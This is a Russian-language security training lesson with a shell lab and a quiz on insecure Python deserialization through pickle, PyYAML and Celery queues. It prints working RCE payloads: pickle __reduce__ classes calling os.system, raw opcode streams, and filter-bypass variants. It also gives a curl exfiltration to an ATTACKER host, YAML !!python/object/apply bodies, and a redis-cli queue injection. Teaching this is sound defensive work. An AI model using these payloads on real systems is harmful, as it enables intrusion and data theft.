---
id: web-python-deser
title: "Python deserialization: pickle, PyYAML, shelve"
category: web
parent: web-deser-languages
difficulty: hard
order: 1
tags: [python, pickle, deserialization, pyyaml, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Небезопасная десериализация в Python: pickle RCE через __reduce__, PyYAML unsafe_load, shelve и обходы."
lab:
  kind: shell
  title: 'Практика: Python pickle RCE'
  toolset: [core, python3, curl]
  workdir: /home/student/task
  files: [task.md, session.txt, gen.py]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Подтверди формат: `base64 -d session.txt | xxd | head -1` — сигнатура `80 04`.'
    - 'Изучи `gen.py`: класс Exploit с `__reduce__`, возвращающий `(os.system, (''cat /flag'',))`.'
    - 'Сгенерируй cookie-файл: `python3 gen.py > cookies.txt`.'
    - 'Отправь cookie: `curl -s https://notes.example/ -b cookies.txt > found.txt`, затем `check`.'
---

## Вопрос, с которого всё начинается

На прошлом уроке мы увидели, что десериализация — это «размораживание» объекта из байтов. Сегодня спустимся в конкретный язык — Python.

Здесь есть важная и неочевидная мысль: **`pickle` — это не формат данных, а виртуальная машина**. Она не просто читает структуру, а **выполняет** последовательность команд. Значит, десериализация чужого pickle — это по определению выполнение чужого кода, заложенное в спецификацию, а не баг. Разберём это на одном примере.

## Наш пример

Есть Flask-приложение `notes.example`. При входе оно ставит cookie:

```bash
$ curl -si https://notes.example/login -d 'user=bob&pass=...' | grep -i set-cookie
Set-Cookie: session=gASVJgAAAAAAAACM...
```

Декодируем base64:

```bash
$ echo 'gASVJgAAAAAAAACM...' | base64 -d | xxd | head -1
00000000: 8004 9528 0000 0000 0000 8c0a 5f5f 6d61  ...(..........__ma
```

`80 04` — сигнатура pickle (protocol 4), `__ma...` — начало имени модуля. Сервер хранит состояние сессии как pickle и при следующем запросе делает `pickle.loads`. Вопрос: контролируем ли мы этот pickle? Да — он целиком в cookie.

## Шаг 1: как pickle выполняет код

Pickle-поток — это список команд (**опкодов**) для виртуальной машины. Опкод `GLOBAL` кладёт на стек ссылку на любой импортируемый объект, а `REDUCE` вызывает его. Python-класс может задать это через метод `__reduce__`, который возвращает пару `(что_вызвать, с_какими_аргументами)`:

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
```

Когда сервер вызовет `pickle.loads(payload)`, Python выполнит `os.system('id')`. Сравни с `json.loads`: JSON описывает только данные (числа, строки, списки) и не может ничего вызвать. Поэтому правило простое: **безопасной десериализации недоверенного pickle не существует**.

## Шаг 2: безопасный детектор и подтверждение

Сначала убедимся, что канал есть, и не уроним сервис. Попросим сервер обратиться к нам:

```python
# gen.py
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER:8080/$(id|base64)',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

```bash
$ python3 -m http.server 8080 &          # наш listener
$ curl -s https://notes.example/ -b "session=$(python3 gen.py)"
# в логе http-сервера:
# 203.0.113.9 - - "GET /dWlkPTAocm9vdCkK HTTP/1.1" 404 -
```

Пришёл запрос с base64 от `id=0(root)` — команда выполнена. Артефакт подтверждён через OOB. Дальше можно поднять reverse shell, но помни: это уже полноценное вторжение, только с согласия.

## Шаг 3: зачем читать байткод вручную

Иногда фильтр вырезает подстроку `os` или `system`, и обычный класс не проходит. Тогда собирают pickle «сырыми» опкодами. Разобрать поток можно дизассемблером:

```bash
$ python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps({'a':1})).decode())"
$ python3 -m pickletools payload.bin
```

Минимальный читаемый payload для `os.system('id')` (protocol 0) выглядит так:

```text
cos
system
(S'id'
tR.
```

`c` (GLOBAL) — модуль `os`, объект `system`; `(` — метка стека; `S'id'` — строка; `t` — собрать кортеж; `R` — вызвать. Такой поток можно вставить в параметр как есть, если приложение принимает «сырые» байты или latin-1-строку.

## Шаг 4: обходы фильтров

- **Фильтр по подстроке `os`** → собирай строку динамически: `__import__('o'+'s')`, `getattr(__import__('os'), 'sys'+'tem')`, либо `subprocess`/`posix` вместо `os`.
- **Whitelist через `find_class`** → ищи разрешённый класс с опасным `__setstate__`/`__reduce__`.
- **Кодировка** → payload почти всегда заворачивают в base64 (cookies) или hex (заголовки).
- **Размер** → `pickletools.optimize` убирает лишние MEMO-опкоды.

Вот как выглядит генератор с динамическим именем модуля:

```python
class RCE:
    def __reduce__(self):
        return (getattr(__import__('o'+'s'), 'sys'+'tem'), ('id',))
```

## Шаг 5: не только pickle — YAML

Второй частый источник — парсинг YAML. У `PyYAML` есть безопасная функция `safe_load` и опасная `load`:

```python
yaml.safe_load(user_input)                     # безопасно: только базовые типы
yaml.load(user_input, Loader=yaml.Loader)      # ОПАСНО
yaml.full_load(user_input)                     # ОПАСНО
```

Ключевой факт: **до PyYAML 5.1 `yaml.load` был небезопасен по умолчанию**, а с 6.0 требует явный `Loader` — но если код передаёт `Loader=yaml.Loader`, он по-прежнему уязвим. Payload для опасного `load`:

```yaml
!!python/object/apply:os.system ["id"]
```

Отправляем в теле:

```bash
$ curl -s -X POST https://notes.example/api \
  -H 'Content-Type: application/x-yaml' \
  --data-binary '!!python/object/apply:os.system ["bash -c \"id > /tmp/pwned\""]'
```

Если тег `!!python/object/apply` отфильтрован, есть и другие: `!!python/object/new`, `!!python/name`, `!!python/module` — все исполняются загрузчиком. YAML часто приходит в загрузке конфигов, CI-манифестах, Helm values, Kubernetes-объектах.

## Шаг 6: где ещё живёт pickle

- **Очереди:** Celery по умолчанию сериализует задачи pickle (`task_serializer='pickle'`). Если можно писать в брокер (Redis без пароля), кладём туда свой pickle, и воркер его десериализует.
- **Кеш:** Redis/Memcached, куда кладутся сериализованные объекты.
- **Файлы:** `.pkl`, `.pickle`, `.joblib`, `.npy` (numpy с `allow_pickle=True`).
- **Django-сессии** с pickle-бэкендом.
- **`shelve`/`dill`/`joblib`** — все на базе pickle, те же риски.

Точки входа ищем по сигнатурам в base64 (`gASV`, `gAJ`, `8004`) и по ошибкам `UnpicklingError`, `invalid load key`, `__reduce__`.

## Шаг 7: очередь задач — pickle без аутентификации

Очень частый путь в облачных стеках — **очередь задач**. Celery (популярный планировщик фоновых задач в Python) по умолчанию сериализует задачи pickle'ом: `task_serializer='pickle'`. Воркер читает задачу из брокера (часто Redis или RabbitMQ) и десериализует её. Если брокер доступен без пароля, ты можешь положить туда свой pickle, и воркер его выполнит.

```bash
# Redis без пароля; кладём задачу с вредоносным pickle
$ redis-cli -h TARGET RPUSH celery \
  '{"content-type":"application/x-python-serialize","body":"<base64 pickle>"}'
```

Тело `body` — это тот же pickle, что мы собирали в шаге 1, только завёрнутый в формат сообщения Celery. Обрати внимание: тут не нужен ни cookie, ни параметр — достаточно записи в хранилище. Поэтому при аудите Python-приложения всегда проверяй: есть ли Redis/RabbitMQ, доступны ли они снаружи или через SSRF, и какой `serializer` настроен. Связка «SSRF → Redis → очередь → RCE» разобрана в `web-ssrf-protocol-smuggling`.

## Что мы теперь знаем

- `pickle` — исполняемая виртуальная машина; десериализация чужого pickle = RCE.
- Метод `__reduce__` задаёт, что вызвать: `(os.system, ('id',))`.
- Байткод можно читать и писать вручную (`pickletools`) — для обхода фильтров.
- Опасный YAML: `yaml.load` без `safe_load`, тег `!!python/object/apply`.
- Pickle живёт не только в cookie, но и в очередях, кеше, файлах, сессиях.
- Сначала безопасный детектор (OOB `curl`), потом RCE; артефакт — вывод команды.

## На что смотреть дальше

- **Не считай pickle «форматом данных»** — это код; JSON, в отличие от него, безопасен.
- **Проверяй загрузчик YAML** — `Loader=yaml.Loader`/`full_load` уязвимы даже на новых версиях.
- **Слепой канал — норма:** если stdout не видно, используй OOB или запись файла.
- **Очереди и кеш** часто без аутентификации — это отдельная большая поверхность.
- **Подписанный/зашифрованный pickle** — сначала ищи ключ; без него вектор закрыт.
- **Только с согласия.** RCE меняет состояние прода; проверяй на тестовом стенде.

## Квиз

Проверь себя.

```quiz
- question: "Почему десериализация pickle опасна?"
  options:
    - "Он медленный"
    - "Это исполняемая VM: при загрузке вызывается произвольный код через `__reduce__`"
    - "Он шифрует данные"
    - "Он не поддерживает строки"
  answer: 1
  explanation: "Pickle выполняет опкоды, включая вызов функций."
- question: "Какой метод задаёт вызов при `pickle.loads`?"
  options:
    - "`__init__`"
    - "`__reduce__`"
    - "`__str__`"
    - "`__dict__`"
  answer: 1
  explanation: "`__reduce__` возвращает пару (callable, args)."
- question: "Какая функция PyYAML безопасна?"
  options:
    - "`yaml.load`"
    - "`yaml.safe_load`"
    - "`yaml.full_load`"
    - "`yaml.unsafe_load`"
  answer: 1
  explanation: "`safe_load` запрещает python-теги."
- question: "Какой YAML-тег выполняет команду?"
  options:
    - "`!!str`"
    - "`!!python/object/apply:os.system`"
    - "`!!int`"
    - "`!!map`"
  answer: 1
  explanation: "`python/object/apply` вызывает указанную функцию."
- question: "Где ещё, кроме cookies, встречается pickle?"
  options:
    - "В HTML"
    - "В очередях (Celery/RQ) и кеше"
    - "В TLS-сертификатах"
    - "В DNS-записях"
  answer: 1
  explanation: "Очереди сериализуют задачи pickle'ом и часто без аутентификации."
```

## Куда дальше

Дальше мы посмотрим, как то же самое выглядит в **Node.js** (`web-node-deser`), где вместо `__reduce__` код исполняется через IIFE в `node-serialize`. А пока главное запомни: если Python **загружает твой pickle или YAML**, он может выполнить твою команду.

## Где пригодится

- **CTF (Web):** задачи на Python-deser.
- **Bug bounty:** RCE в Flask/Django-сервисах с pickle.
- **Пентест:** аудит Python-приложений и очередей.
- **Работа (AppSec):** JSON вместо pickle, `safe_load`, подпись/шифрование сериализованных данных.
